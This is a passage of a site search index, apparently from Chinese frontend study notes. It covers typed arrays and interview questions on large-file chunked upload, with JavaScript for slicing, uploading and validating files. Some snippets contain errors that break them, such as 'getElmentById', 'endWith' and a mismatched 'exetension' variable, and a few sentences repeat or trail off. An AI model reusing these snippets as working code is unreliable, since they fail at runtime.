(\u7f13\u51b2\u533a\u662f\u4ee3\u8868\u6570\u636e\u5757\u7684\u5bf9\u8c61\uff1b\u5b83\u6ca1\u6709\u4efb\u4f55\u683c\u5f0f\u53ef\u8a00\uff0c\u4e5f\u4e0d\u63d0\u4f9b\u8bbf\u95ee\u5176\u5185\u5bb9\u7684\u673a\u5236\u3002\u4e3a\u4e86\u8bbf\u95ee\u7f13\u51b2\u533a\u4e2d\u5305\u542b\u7684\u5185\u5b58\uff0c\u60a8\u9700\u8981\u4f7f\u7528\u89c6\u56fe\u3002\u89c6\u56fe\u63d0\u4f9b\u4e0a\u4e0b\u6587\uff0c\u5373\u6570\u636e\u7c7b\u578b\u3001\u8d77\u59cb\u504f\u79fb\u91cf\u548c\u5143\u7d20\u6570\u91cf\u3002)</p> <p></p> <p><code>Uint8Array</code> Size in bytes = 1 (\u4ee58\u4f4d,1\u5b57\u8282\u4e3a\u5355\u4f4d\uff09</p> <p><code>Uint16Array</code> Size in bytes = 2 (\u4ee516\u4f4d,2\u5b57\u8282\u4e3a\u5355\u4f4d)</p> <p><code>Uint32Array</code> size in bytes = 4 (\u4ee532\u4f4d, 4\u5b57\u8282\u4e3a\u5355\u4f4d)</p> <p><code>Float64Array</code> size in bytes = 8 (\u4ee564\u4f4d, 8\u5b57\u8282\u4e3a\u5355\u4f4d)</p>"},{"location":"projects/buffer-and-view/#browser-apis-that-use-typed-arrays","title":"Browser APIs that use Typed Arrays","text":"<p><code>WebGL</code></p> <p><code>Canvas 2D</code></p> <p><code>TextEncoder</code></p> <p><code>FileReader</code></p> <p><code>XMLHttpRequest2</code></p> <p><code>File</code></p> <p><code>Web Worker Transferable objects</code></p> <p><code>Media Source</code></p> <p><code>Binary WebSockets</code></p>"},{"location":"projects/business_flow/","title":"Business flow","text":"<p>vo</p> <p>DTO PO DAO</p>"},{"location":"projects/file-upload/","title":"\u5927\u6587\u4ef6\u4e0a\u4f20","text":"<ul> <li>\u4ee3\u7801\u4ed3\u5e93\u5730\u5740</li> <li>\u6f14\u793a\u5730\u5740</li> </ul>"},{"location":"projects/file-upload/#2","title":"2.\u5927\u6587\u4ef6\u4e0a\u4f20\u9762\u8bd5\u9898","text":"<ol> <li>\u57fa\u7840\u6982\u5ff5</li> <li>\u63cf\u8ff0\u5b9e\u73b0\u5927\u6587\u4ef6\u4e0a\u4f20\u7684\u57fa\u672c\u6d41\u7a0b</li> <li>\u89e3\u91ca\u4e3a\u4ec0\u4e48\u5927\u6587\u4ef6\u4e0a\u4f20\u6bd4\u666e\u901a\u6587\u4ef6\u4e0a\u4f20\u66f4\u5177\u6709\u6311\u6218\u6027</li> <li>\u4ec0\u4e48\u662f\u5206\u7247\u4e0a\u4f20\uff0c\u5b83\u5982\u4f55\u5e2e\u52a9\u524d\u7aef\u5904\u7406\u5927\u6587\u4ef6\u4e0a\u4f20</li> <li>\u6280\u672f\u5b9e\u73b0</li> <li>\u5982\u4f55\u5728\u524d\u7aef\u5b9e\u73b0\u5927\u6587\u4ef6\u7684\u5207\u7247\u4e0a\u4f20\uff1f</li> <li>\u63cf\u8ff0\u4f7f\u7528HTML5\u7684File API\u6765\u5904\u7406\u5927\u6587\u4ef6\u4e0a\u4f20\u7684\u8fc7\u7a0b</li> <li>\u5728\u5904\u7406\u5927\u6587\u4ef6\u4e0a\u4f20\u65f6\uff0c\u5982\u4f55\u5728\u524d\u7aef\u8fdb\u884c\u6587\u4ef6\u7c7b\u578b\u548c\u5927\u5c0f\u7684\u9a8c\u8bc1\uff1f</li> <li>\u6027\u80fd\u4f18\u5316</li> <li>\u5728\u5927\u6587\u4ef6\u4e0a\u4f20\u65f6\uff0c\u5982\u4f55\u4f18\u5316\u524d\u7aef\u6027\u80fd\u4ee5\u63d0\u9ad8\u7528\u6237\u4f53\u9a8c</li> <li>\u5982\u4f55\u5728\u7528\u6237\u4e0a\u4f20\u8fc7\u7a0b\u4e2d\u6682\u505c\u6216\u65ad\u7f51\uff0c\u4f60\u5c06\u5982\u4f55\u5904\u7406\u5df2\u4e0a\u4f20\u7684\u6570\u636e</li> <li>\u5982\u4f55\u5728\u524d\u7aef\u5b9e\u73b0\u4e0a\u4f20\u8fdb\u5ea6\u7684\u53ef\u89c6\u5316\u53cd\u9988</li> <li>\u9519\u8bef\u5904\u7406\u548c\u5b89\u5168\u6027</li> <li>\u5728\u5927\u6587\u4ef6\u4e0a\u4f20\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u9047\u5230\u7f51\u7edc\u9519\u8bef\u6216\u670d\u52a1\u5668\u9519\u8bef\uff0c\u524d\u7aef\u5e94\u8be5\u5982\u4f55\u5904\u7406\u4f18\u5316</li> <li>\u63cf\u8ff0\u5728\u5927\u6587\u4ef6\u4e0a\u4f20\u4e2d\u5e38\u89c1\u7684\u5b89\u5168\u95ee\u9898\u53ca\u5176\u89e3\u51b3\u65b9\u6848</li> <li>\u5982\u4f55\u5728\u524d\u7aef\u5b9e\u73b0\u5927\u6587\u4ef6\u4e0a\u4f20\u7684\u52a0\u5bc6\u5904\u7406</li> <li>\u540e\u7aef\u4ea4\u4e92</li> <li>\u5927\u6587\u4ef6\u4e0a\u4f20\u4e2d\u7684\u524d\u540e\u7aef\u534f\u4f5c\u901a\u5e38\u662f\u600e\u6837\u7684\uff1f\u8bf7\u63cf\u8ff0\u6574\u4e2a\u8fc7\u7a0b</li> <li>\u5982\u679c\u540e\u7aefAPI\u5728\u4e0a\u4f20\u8fc7\u7a0b\u4e2d\u53d1\u751f\u66f4\u6539\uff0c\u524d\u7aef\u5e94\u8be5\u5982\u4f55\u7075\u6d3b\u9002\u5e94</li> <li>\u5728\u5927\u6587\u4ef6\u4e0a\u4f20\u4e2d\uff0c\u524d\u7aef\u548c\u540e\u7aef\u5982\u4f55\u534f\u4f5c\u5904\u7406\u4e0a\u4f20\u8fdb\u5ea6\u548c\u9519\u8bef\u6062\u590d\uff1f</li> <li>\u7528\u6237\u4f53\u9a8c</li> <li>\u5982\u4f55\u8bbe\u8ba1\u4e00\u4e2a\u7528\u6237\u53cb\u597d\u7684\u5927\u6587\u4ef6\u4e0a\u4f20\u754c\u9762</li> <li>\u5728\u4e0a\u4f20\u5927\u6587\u4ef6\u65f6\uff0c \u5982\u4f55\u51cf\u5c11\u5bf9\u7528\u6237\u64cd\u4f5c\u5176\u4ed6\u7f51\u7ad9\u7684\u5f71\u54cd</li> <li>\u5982\u679c\u9700\u8981\u4e0a\u4f20\u591a\u4e2a\u5927\u6587\u4ef6\uff0c\u4f60\u5c06\u5982\u4f55\u8bbe\u8ba1\u8fd9\u4e2a\u4e0a\u4f20\u6d41\u7a0b</li> <li>\u73b0\u4ee3\u6280\u672f\u548c\u6846\u67b6</li> <li>\u4f7f\u7528React/Vue\u7b49\u73b0\u4ee3\u524d\u7aef\u6846\u67b6\uff0c\u5982\u4f55\u5b9e\u73b0\u5927\u6587\u4ef6\u4e0a\u4f20\u7684\u529f\u80fd</li> <li>\u5728\u5927\u6587\u4ef6\u4e0a\u4f20\u4e2d\uff0c web Workers\u80fd\u53d1\u6325\u4ec0\u4e48\u4f5c\u7528</li> <li>\u63cf\u8ff0\u4f7f\u7528\u4e91\u670d\u52a1\uff08\u5982AWS S3\uff09 \u8fdb\u884c\u5927\u6587\u4ef6\u4e0a\u4f20\u7684\u4f18\u52bf\u548c\u6311\u6218</li> </ol>"},{"location":"projects/file-upload/#21","title":"2.1 \u63cf\u8ff0\u5728\u524d\u7aef\u5b9e\u73b0\u5927\u6587\u4ef6\u4e0a\u4f20\u7684\u57fa\u672c\u6d41\u7a0b","text":"<ol> <li>\u6587\u4ef6\u9009\u62e9\uff1a</li> <li>\u7528\u6237\u901a\u8fc7\u62d6\u653e\u6587\u4ef6\u62d6\u653e\u533a\u57df\u6216\u4e0a\u4f20\u6309\u94ae</li> <li>\u4f7f\u7528HTML5\u7684<code>File API</code> \u6765\u83b7\u53d6\u7528\u6237\u9009\u62e9\u7684\u6587\u4ef6\u4fe1\u606f</li> <li>\u6587\u4ef6\u5207\u7247\uff1a</li> <li>\u5bf9\u4e8e\u5927\u6587\u4ef6\uff0c \u76f4\u63a5\u4e0a\u4f20\u6574\u4e2a\u6587\u4ef6\u53ef\u80fd\u5bfc\u81f4\u95ee\u9898\uff08\u5982\u7f51\u7edc\u4e0d\u7a33\u5b9a\u5bfc\u81f4\u4e0a\u4f20\u5931\u8d25\u3001\u6d4f\u89c8\u5668\u5d29\u6e83\uff09\u56e0\u6b64\u5c06\u6587\u4ef6\u5207\u5206\u6210\u591a\u4e2a\u5c0f\u5757\u662f\u5e38\u89c1\u505a\u6cd5</li> <li>\u4f7f\u7528JavaScript\u5c06\u6587\u4ef6\u5207\u5206\u6210\u591a\u4e2a\u5c0f\u5757\uff0c \u6bcf\u4e2a\u5757\u53ef\u4ee5\u662f\u56fa\u5b9a\u5927\u5c0f\uff08\u59821MB\uff09</li> <li>\u4e0a\u4f20\u524d\u51c6\u5907</li> <li>\u53ef\u4ee5\u5411\u670d\u52a1\u5668\u53d1\u9001\u4e00\u4e2a\u9884\u8bf7\u6c42\uff0c\u544a\u77e5\u670d\u52a1\u5668\u5c06\u8981\u4e0a\u4f20\u7684\u6587\u4ef6\u4fe1\u606f\uff08\u6587\u4ef6\u540d\u3001\u6587\u4ef6\u5927\u5c0f\u3001\u5207\u7247\u6570\u91cf\u3001\u5207\u7247\u5927\u5c0f\uff09</li> <li>\u670d\u52a1\u5668\u53ef\u4ee5\u5728\u6b64\u65f6\u8fdb\u884c\u4e00\u4e9b\u51c6\u5907\u5de5\u4f5c\uff0c\u5982\u68c0\u67e5\u6587\u4ef6\u662f\u5426\u5df2\u90e8\u5206\u4e0a\u4f20\uff0c\u4e3a\u5373\u5c06\u4e0a\u4f20\u7684\u6587\u4ef6\u5206\u914d\u8d44\u6e90</li> <li>\u5e76\u884c\u6216\u987a\u5e8f\u4e0a\u4f20\u5207\u7247\uff1a</li> <li>\u5207\u7247\u53ef\u4ee5\u5e76\u884c\u4e0a\u4f20\uff0c\u4ee5\u63d0\u9ad8\u4e0a\u4f20\u6548\u7387\uff0c\u4e5f\u53ef\u4ee5\u987a\u5e8f\u4e0a\u4f20\uff0c\u4ee5\u964d\u4f4e\u670d\u52a1\u5668\u538b\u529b</li> <li>\u6bcf\u4e2a\u5207\u7247\u4f5c\u4e3a\u4e00\u4e2a\u5355\u72ec\u7684\u8bf7\u6c42\u53d1\u9001\u5230\u670d\u52a1\u5668\uff0c\u8fd9\u4e9b\u8bf7\u6c42\u901a\u5e38\u5305\u542b\u4e00\u4e9b\u5143\u6570\u636e\uff08\u5207\u7247\u7d22\u5f15\u3001\u603b\u5207\u7247\u6570\uff09</li> <li>\u9519\u8bef\u5904\u7406\u548c\u91cd\u8bd5\u673a\u5236\uff1a</li> <li>\u5728\u4e0a\u4f20\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u4e9b\u5207\u7247\u53ef\u80fd\u56e0\u7f51\u7edc\u95ee\u9898\u6216\u670d\u52a1\u5668\u95ee\u9898\u4e0a\u4f20\u5931\u8d25\uff0c\u524d\u7aef\u5e94\u6709\u673a\u5236\u68c0\u6d4b\u8fd9\u4e9b\u5931\u8d25\uff0c\u5e76\u4e14\u80fd\u591f\u91cd\u4f20\u8fd9\u4e9b\u5207\u7247</li> <li>\u53ef\u4ee5\u8bbe\u7f6e\u91cd\u8bd5\u6b21\u6570\u9650\u5236\uff0c\u4ee5\u907f\u514d\u65e0\u9650\u91cd\u8bd5</li> <li>\u4e0a\u4f20\u8fdb\u5ea6\u53cd\u9988</li> <li>\u5728\u4e0a\u4f20\u8fc7\u7a0b\u4e2d\uff0c\u524d\u7aef\u5e94\u63d0\u4f9b\u5b9e\u65f6\u7684\u4e0a\u4f20\u8fdb\u5ea6\u53cd\u9988\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7\u76d1\u542c\u6bcf\u4e2a\u5207\u7247\u7684\u4e0a\u4f20\u8bf7\u6c42\u7684\u8fdb\u5ea6\u4e8b\u4ef6\u4e8b\u4ef6\u6765\u5b9e\u73b0</li> <li>\u5b8c\u6210\u4e0a\u4f20\uff1a</li> <li>\u6240\u6709\u5207\u7247\u4e0a\u4f20\u5b8c\u6210\u540e\uff0c\u524d\u7aef\u5411\u670d\u52a1\u5668\u53d1\u9001\u4e00\u4e2a\u5b8c\u6210\u4e0a\u4f20\u7684\u4fe1\u53f7</li> <li>\u670d\u52a1\u5668\u6536\u5230\u5b8c\u6210\u4fe1\u53f7\uff0c\u5f00\u59cb\u5c06\u6240\u6709\u5207\u7247\u7ec4\u5408\u6210\u539f\u59cb\u6587\u4ef6</li> <li>\u6587\u4ef6\u9a8c\u8bc1\u548c\u6e05\u7406</li> <li>\u670d\u52a1\u5668\u7ec4\u5408\u6587\u4ef6\u540e\uff0c\u53ef\u4ee5\u5bf9\u6587\u4ef6\u8fdb\u884c\u9a8c\u8bc1\u3002\u786e\u4fdd\u6587\u4ef6\u7684\u5b8c\u6574\u662f\u548c\u6b63\u786e\u6027</li> <li>\u9a8c\u8bc1\u5b8c\u6210\u540e\uff0c\u524d\u7aef\u548c\u540e\u7aef\u53ef\u4ee5\u8fdb\u884c\u5fc5\u8981\u7684\u6e05\u7406\u7684\u5de5\u4f5c\uff0c\u5982\u5220\u9664\u4ee5\u4e0a\u4f20\u7684\u5207\u7247\u6587\u4ef6</li> <li>\u9519\u8bef\u5904\u7406\u548c\u7528\u6237\u53cd\u9988</li> <li>\u5982\u679c\u5728\u4efb\u4f55\u4e0a\u4f20\u9636\u6bb5\u53d1\u751f\u9519\u8bef\uff0c\u5e94\u5373\u4f7f\u5c06\u9519\u8bef\u4fe1\u606f\u53cd\u9988\u7ed9\u7528\u6237</li> <li>\u540c\u65f6\uff0c\u524d\u7aef\u5e94\u63d0\u4f9b\u7528\u6237\u53cb\u597d\u7684\u9519\u8bef\u4fe1\u606f\u548c\u53ef\u80fd\u7684\u89e3\u51b3\u65b9\u6848</li> </ol>"},{"location":"projects/file-upload/#22","title":"2.2 \u89e3\u91ca\u4e3a\u4ec0\u4e48\u5927\u6587\u4ef6\u4e0a\u4f20\u6bd4\u666e\u901a\u6587\u4ef6\u4e0a\u4f20\u66f4\u5177\u6311\u6218\u6027","text":"<ol> <li> <p>\u7f51\u7edc\u7a33\u5b9a\u6027\u95ee\u9898\uff1a\u5927\u6587\u4ef6\u4e0a\u4f20\u9700\u8981\u66f4\u957f\u65f6\u95f4\uff0c\u8fd9\u589e\u52a0\u4e86\u7f51\u7edc\u8fde\u63a5\u4e2d\u65ad\u7684\u98ce\u9669\u3002\u8fd9\u589e\u52a0\u4e86\u7f51\u7edc\u8fde\u63a5\u4e2d\u65ad\u7684\u98ce\u9669\uff0c\u5982\u679c\u5728\u4e0a\u4f20\u8fc7\u7a0b\u4e2d</p> </li> <li> <p>\u8d44\u6e90\u6d88\u8017\uff1a \u4e0a\u4f20\u5927\u6587\u4ef6\u4f1a\u5360\u7528\u66f4\u591a\u7684\u7f51\u7edc\u5e26\u5bbd\u548c\u670d\u52a1\u5668\u8d44\u6e90.\u8fd9\u53ef\u80fd\u5bfc\u81f4\u670d\u52a1\u5668\u6027\u80fd\u4e0b\u6765\uff0c\u5f71\u54cd\u5176\u4ed6\u7528\u6237\u7684\u4f7f\u7528\u4f53\u9a8c</p> </li> <li> <p>\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u9650\u5236\uff1a \u67d0\u4e9b\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u5bf9\u4e0a\u4f20\u6587\u4ef6\u7684\u5927\u5c0f\u6709\u9650\u5236\u3002\u8d85\u51fa\u8fd9\u4e2a\u5927\u5c0f\u9650\u5236\u7684\u6587\u4ef6\uff0c\u9700\u8981\u7279\u6b8a\u7684\u914d\u7f6e\u6216\u6280\u672f\u6765\u5904\u7406</p> </li> <li> <p>\u6570\u636e\u5b8c\u6574\u6027\u548c\u5b89\u5168\u6027\uff1a\u5728\u957f\u65f6\u95f4\u7684\u4f20\u8f93\u8fc7\u7a0b\u4e2d\uff0c\u786e\u4fdd\u6570\u636e\u7684\u5b8c\u6574\u6027\u548c\u5b89\u5168\u6027\u662f\u4e00\u5927\u6311\u6218\u3002\u9700\u8981\u989d\u5916\u7684\u63aa\u65bd\u6765\u4fdd\u8bc1\u6587\u4ef6\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u4e0d\u88ab\u635f\u574f\u6216\u7be1\u6539</p> </li> <li> <p>\u7528\u6237\u4f53\u9a8c\u95ee\u9898\uff1a \u5927\u6587\u4ef6\u4e0a\u4f20\u53ef\u80fd\u9700\u8981\u5f88\u957f\u65f6\u95f4\uff0c\u53ef\u80fd\u5bfc\u81f4\u7528\u6237\u4f53\u9a8c\u4e0d\u4f73\uff0c\u7528\u6237\u53ef\u80fd\u4e0d\u6e05\u695a\u4e0a\u4f20\u8fdb\u5ea6\uff0c\u6216\u8005\u5728\u7b49\u5f85\u8fc7\u7a0b\u4e2d\u611f\u5230\u6cae\u4e27</p> </li> </ol> <p>\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e9b\u6311\u6218\uff0c\u901a\u5e38\u4f1a\u91c7\u7528\u4e00\u4e9b\u7b56\u7565\uff0c\u5982\u6587\u4ef6\u5206\u5272\u4e0a\u4f20\uff08\u5c06\u5927\u6587\u4ef6\u5206\u5272\u6210\u5c0f\u5757\uff0c\u5206\u522b\u4e0a\u4f20), \u65ad\u70b9\u7eed\u4f20\uff08\u5728\u8fde\u63a5\u4e2d\u65ad\u540e\u80fd\u4ece\u65ad\u70b9\u91cd\u65b0\u5f00\u59cb\u4e0a\u4f20\uff09\uff0c\u4ee5\u53ca\u4f18\u5316\u7f51\u7edc\u548c\u670d\u52a1\u5668\u914d\u7f6e</p>"},{"location":"projects/file-upload/#23","title":"2.3 \u4ec0\u4e48\u662f\u5206\u7247\u4e0a\u4f20\uff0c \u4ed6\u5982\u4f55\u5e2e\u52a9\u4eb2\u7aef\u5904\u7406\u5927\u6587\u4ef6\u4e0a\u4f20\uff1f","text":"<p>\u5206\u522b\u4e0a\u4f20\u662f\u4e00\u79cd\u5904\u7406\u5927\u6587\u4ef6\u4e0a\u4f20\u7684\u6280\u672f\uff0c \u4ed6\u5c06\u5927\u6587\u4ef6\u5206\u5272\u6210\u591a\u4e2a\u7247\u6bb5</p> <ol> <li>\u652f\u6301\u65ad\u70b9\u7eed\u4f20\uff1a\u5982\u679c\u4e0a\u4f20\u8fc7\u7a0b\u4e2d\u65ad\uff0c\u53ef\u4ee5\u5728\u7f51\u7edc\u6062\u590d\u540e\u7ee7\u7eed\u4e0a\u4f20\u672a\u5b8c\u6210\u7684\u5206\u7247\u3002\u8fd9\u5bf9\u79fb\u52a8\u8bbe\u5907\u7528\u6237\u7279\u522b\u91cd\u8981\uff0c\u56e0\u4e3a\u5b83\u4eec\u53ef\u80fd\u5728\u4e0d\u7a33\u5b9a\u7684\u7f51\u7edc\u73af\u5883\u4e0b\u4e0a\u4f20\u6587\u4ef6</li> <li>\u4f18\u5316\u4e0a\u4f20\u901f\u5ea6\uff1a \u5206\u7247\u5141\u8bb8\u5e76\u884c\u4e0a\u4f20\uff0c\u53ef\u4ee5\u540c\u65f6\u4e0a\u4f20\u591a\u4e2a\u5206\u7247\uff0c\u8fd9\u53ef\u4ee5\u6709\u6548\u5229\u7528\u7f51\u7edc\u5e26\u5bbd\uff0c\u4ece\u800c\u52a0\u5feb\u4e0a\u4f20\u901f\u5ea6</li> <li>\u7075\u6d3b\u7684\u9519\u8bef\u5904\u7406\uff1a\u5206\u914d\u4e0a\u4f20\u4e2d\uff0c\u53ef\u4ee5\u9488\u5bf9\u5355\u4e2a\u5206\u7247\u8fdb\u884c\u9519\u8bef\u68c0\u6d4b\u548c\u6062\u590d\uff0c\u800c\u4e0d\u662f\u5bf9\u6574\u4e2a\u6587\u4ef6\u8fdb\u884c\u5904\u7406\u3002\u8fd9\u63d0\u9ad8\u4e86\u4e0a\u4f20\u8fc7\u7a0b\u7684\u6548\u7387</li> <li>\u8fdb\u7a0b\u63a7\u5236\u548c\u7ba1\u7406\uff1a \u5206\u7247\u4e0a\u4f20\u4f7f\u5f97\u53ef\u4ee5\u7cbe\u51c6\u5c55\u793a\u4e0a\u4f20\u8fdb\u5ea6\uff0c\u63d0\u9ad8\u7528\u6237\u4f53\u9a8c</li> <li>\u7ed5\u8fc7\u6587\u4ef6\u5927\u5c0f\u9650\u5236\uff1a \u67d0\u4e9b\u6d4f\u89c8\u5668\u6216\u670d\u52a1\u5668\u5bf9\u5355\u6b21\u4e0a\u4f20\u7684\u6587\u4ef6\u5927\u5c0f\u6709\u9650\u5236\u3002\u5206\u7247\u4e0a\u4f20\u53ef\u4ee5\u7ed5\u8fc7\u8fd9\u4e9b\u9650\u5236\uff0c\u56e0\u4e3a\u5206\u7247\u90fd\u5c0f\u4e8e\u8fd9\u4e2a\u9650\u5236</li> </ol>"},{"location":"projects/file-upload/#24-javascript","title":"2.4 \u5982\u4f55\u5728\u524d\u7aef\u4f7f\u7528JavaScript\u5b9e\u73b0\u5927\u6587\u4ef6\u7684\u5207\u7247\u4e0a\u4f20\uff1f","text":"<ol> <li>\u9009\u62e9\u6587\u4ef6</li> </ol> <pre><code>&lt;input type=\"file\" id=\"fileInput\"/&gt;\n</code></pre> <ol> <li>\u5207\u5272\u6587\u4ef6</li> </ol> <pre><code>function sliceFile(file, chunkSize) {\n  let chunks = []\n  let size = file.size;\n\n  for (let start = 0; start &lt; size; start += chunkSize) {\n    let end = Math.min(start + chunkSize, size)\n    chunks.push(file.slice(start, end))\n  }\n  return chunks\n}\n</code></pre> <ol> <li>\u4e0a\u4f20\u5206\u7247</li> </ol> <pre><code>async function uploadChunk(chunk , index) {\n  let formData = new FormData()\n  formData.append('file', chunk)\n  formData.append('index', index)\n  let response = await fetch('/upload', {\n    method:\"POST\",\n    body: formData\n  })\n\n  return response.ok // \u540e\u7aef\u7ea6\u5b9a\uff0c \u4e5f\u53ef\u4ee5\u662fresponse.errCode\n}\n</code></pre> <ol> <li>\u5408\u5e76\u5206\u7247 \u4e00\u65e6\u6240\u6709\u5206\u7247\u90fd\u6210\u529f\u4e0a\u4f20\uff0c\u670d\u52a1\u5668\u9700\u8981\u4e00\u4e2a\u673a\u5236\u91cd\u65b0\u7ec4\u5408\u8fd9\u4e9b\u5206\u7247\u3002\u8fd9\u901a\u5e38\u5728\u670d\u52a1\u7aef\u7684\u4e0a\u4f20\u811a\u672c\u4e2d\u5904\u7406</li> <li>\u5b8c\u6574\u7684\u4e0a\u4f20\u7684\u8fc7\u7a0b</li> </ol> <pre><code>document.getElmentById('fileInput').addEventListener('change', async (event) =&gt; {\n  let file = event.target.files[0]\n  let chunkSize = 1024 * 1024 // 1MB\n  let chunks = sliceFile(file, chunkSize)\n  for (let i = 0; i &lt; chunks.length; i++) {\n    let success = await uploadChunk(chunks[i], i)\n    if (!success) {\n            console.error('Upload failed for chunk' + i)\n      return;\n    }\n  }\n  console.log('File upload successfully')\n})\n</code></pre> <p>\u6ce8\u610f\u4e8b\u9879</p> <ul> <li>\u9519\u8bef\u5904\u7406\uff1a \u5b9e\u9645\u5e94\u7528\u4e2d\u9700\u8981\u8003\u8651\u5230\u9519\u8bef\u5904\u7406\u548c\u91cd\u8bd5\u673a\u5236</li> <li>\u5b89\u5168\u6027\uff1a \u786e\u4fdd\u670d\u52a1\u7aef\u5b89\u5168\u5730\u5904\u7406\u6587\u4ef6\u4e0a\u4f20</li> <li>\u7528\u6237\u4f53\u9a8c\uff1a\u63d0\u4f9b\u4e0a\u4f20\u8fdb\u5ea6\u6307\u793a\u548c\u5fc5\u8981\u7684\u7528\u6237\u53cd\u9988</li> <li>\u5e76\u53d1\u548c\u6027\u80fd\uff1a \u9002\u5f53\u63a7\u5236\u5e76\u53d1\u4e0a\u4f20\u7684\u5206\u7247\u6570\u91cf\uff0c\u4ee5\u5e73\u8861\u4e0a\u4f20\u6570\u91cf\u548c\u670d\u52a1\u5668\u8d1f\u8f7d</li> </ul>"},{"location":"projects/file-upload/#26","title":"2.6 \u5728\u5904\u7406\u5927\u6587\u4ef6\u4e0a\u4f20\u65f6\uff0c\u5982\u4f55\u5728\u524d\u7aef\u8fdb\u884c\u6587\u4ef6\u7c7b\u578b\u548c\u5927\u5c0f\u7684\u9a8c\u8bc1\uff1f","text":"<ol> <li>\u83b7\u53d6\u6587\u4ef6\u5f15\u7528</li> </ol> <pre><code>&lt;input type=\"file\" id=\"fileInput\" /&gt;\n</code></pre> <p>\u76d1\u542c\u6587\u4ef6\u8f93\u5165\u7684\u7684\u53d8\u5316\u6765\u83b7\u53d6\u6587\u4ef6</p> <pre><code>document.getElementById('fileInput').addEventListener('change', (event) =&gt; {\n  const file = event.target.files[0]\n\n})\n</code></pre> <ol> <li>\u9a8c\u8bc1\u6587\u4ef6\u5927\u5c0f</li> </ol> <pre><code>const MAX_SIZE = 10 * 1024 * 1024 // 10MB\nif (file.size &gt; MAX_SIZE) {\n    alert('File is too large. Maximum size is 10MB')\n  return;\n}\n</code></pre> <ol> <li>\u9a8c\u8bc1\u6587\u4ef6\u7c7b\u578b</li> </ol> <p>\u9a8c\u8bc1\u6587\u4ef6\u7c7b\u578b\u901a\u5e38\u662f\u901a\u8fc7\u9a8c\u8bc1\u6587\u4ef6\u7684MIME</p> <pre><code>const ALLOWED_TYPES = ['image/jpeg', 'image/png']\n\nif (!ALLOWED_TYPES.includes(file.type)) {\n    alert('Invalid file type. Only JPEG and PNG are allower')\n  return\n}\n</code></pre> <p>\u6216\u8005\u901a\u8fc7\u6587\u4ef6\u6269\u5c55\u540d\u9a8c\u8bc1\uff1a</p> <pre><code>const ALLOWED_EXTENSIONS = ['.jpeg', '.jpg', '.png']\n\nif (!ALLOWED_EXTENSIONS.some(exetension =&gt; file.name.endWith(extension))) {\n    alert('Invalid file type. Only JPEG and PNG are allowed')\n  return;\n}\n</code></pre> <ol> <li>\u5904\u7406\u9a8c\u8bc1\u7ed3\u679c \u5982\u679c\u6587\u4ef6\u4e0d\u7b26\u5408\u8981\u6c42\uff0c\u4f60\u53ef\u4ee5\u5411\u7528\u6237\u663e\u793a\u4e00\u4e2a\u9519\u8bef\u6d88\u606f\uff0c \u5e76\u505c\u6b62\u8fdb\u4e00\u6b65/\u540e\u7eed\u7684\u4e0a\u4f20\u5904\u7406\u3002\u5982\u679c\u6587\u4ef6\u901a\u8fc7\u9a8c\u8bc1\uff0c\u4f60\u53ef\u4ee5\u7ee7\u7eed\u4e0a\u4f20\u5904\u7406</li> <li>\u7efc\u5408</li> </ol> <pre><code>document.getElementById('fileInput').addEventListener('change', function(event) {\n    var file = event.target.files[0];\n\n    // \u9a8c\u8bc1\u6587\u4ef6\u5927\u5c0f\n    const MAX_SIZE = 10 * 1024 * 1024; // 10MB\n    if (file.size &gt; MAX_SIZE) {\n        alert('File is too large. Maximum size is 10MB.');\n        return;\n    }\n\n    // \u9a8c\u8bc1\u6587\u4ef6\u7c7b\u578b\n    const ALLOWED_TYPES = ['image/jpeg', 'image/png'];\n    if (!ALLOWED_TYPES.includes(file.type)) {\n        alert('Invalid file type. Only JPEG and PNG are allowed.');\n        return;\n    }\n\n    // \u6587\u4ef6\u901a\u8fc7\u9a8c\u8bc1\uff0c\u7ee7\u7eed\u5904\u7406\u4e0a\u4f20\n    // ...\n});\n</code></pre> <p>\u6ce8\u610f\u4e8b\u9879</p> <ul> <li>\u524d\u7aef\u9a8c\u8bc1\u53ef\u4ee5\u88ab\u7ed5\u8fc7\uff0c\u56e0\u6b64\u5e94\u8be5\u59cb\u7ec8\u5728\u670d\u52a1\u5668\u7aef\u518d\u6b21\u9a8c\u8bc1\u6587\u4ef6\u7c7b\u578b\u548c\u5927\u5c0f</li> <li>\u8003\u8651\u5230\u7528\u6237\u4f53\u9a8c\uff0c\u5e94\u8be5\u5728\u6587\u4ef6\u8f93\u5165\u5b57\u6bb5\u65c1\u8fb9\u6216\u5728\u6587\u6863\u4e2d\u8bf4\u660e\u6587\u4ef6\u7684\u7c7b\u578b\u548c\u5927\u5c0f\u9650\u5236</li> </ul>"},{"location":"projects/file-upload/#27","title":"2.7 \u5927\u6587\u4ef6\u4e0a\u4f20\u65f6\uff0c\u5982\u4f55\u4f18\u5316\u524d\u7aef\u6027\u80fd\u4ee5\u63d0\u9ad8\u7528\u6237\u4f53\u9a8c","text":"<ol> <li>\u5206\u7247\u4e0a\u4f20</li> <li>\u65ad\u884c\u7eed\u4f20</li> <li>\u524d\u7aef\u6587\u4ef6\u9a8c\u8bc1</li> <li>\u5728\u4e0a\u4f20\u4e4b\u524d\u9a8c\u8bc1\u6587\u4ef6\u5927\u5c0f\u548c\u7c7b\u578b\uff0c\u9632\u6b62\u4e0d\u5fc5\u8981\u7684\u4e0a\u4f20\u5c1d\u8bd5\uff0c\u8282\u7701\u5e26\u5bbd\u548c\u65f6\u95f4</li> <li>\u63d0\u4f9b\u9519\u8bef\u53cd\u9988\u548c\u89e3\u51b3\u65b9\u6848\uff0c\u5e2e\u52a9\u7528\u6237\u7406\u89e3\u4e3a\u4ec0\u4e48\u6587\u4ef6\u4e0d\u80fd\u4e0a\u4f20</li> <li>\u663e\u793a\u4e0a\u4f20\u8fdb\u5ea6</li> <li>\u67e5\u770b\u5f53\u524d\u72b6\u6001\u548c\u5269\u4f59\u65f6\u95f4</li> <li>\u4f18\u5316\u5185\u5b58\u4f7f\u7528</li> <li>\u5728\u4e0d\u9700\u8981\u65f6\u91ca\u653e\u8d44\u6e90</li> <li>\u4fdd\u6301\u754c\u9762\u54cd\u5e94\u6027</li> 